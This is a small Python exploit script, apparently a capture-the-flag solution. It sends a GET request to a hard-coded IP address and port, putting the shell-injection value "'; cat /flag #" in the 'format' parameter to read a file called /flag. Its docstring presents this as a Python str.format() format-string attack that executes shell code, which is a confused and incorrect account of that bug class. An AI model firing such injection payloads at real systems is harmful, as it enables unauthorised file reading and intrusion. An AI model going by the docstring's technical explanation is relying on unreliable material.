#!/usr/bin/env python3

import requests


def main():
    """
    Exploit a Python format string vulnerability to read the contents of /flag.

    The URL http://94.237.54.116:59543 is vulnerable to a format string injection
    attack. The "format" parameter to the URL is used as the format string for a
    str.format() call. We can supply a format string that includes shell code to
    execute the command "cat /flag", and the output of that command will be
    returned in the response.
    """
    url = "http://94.237.54.116:59543"
    response = requests.get(url, params={"format": "'; cat /flag #"})
    print(response.text)


if __name__ == "__main__":
    main()
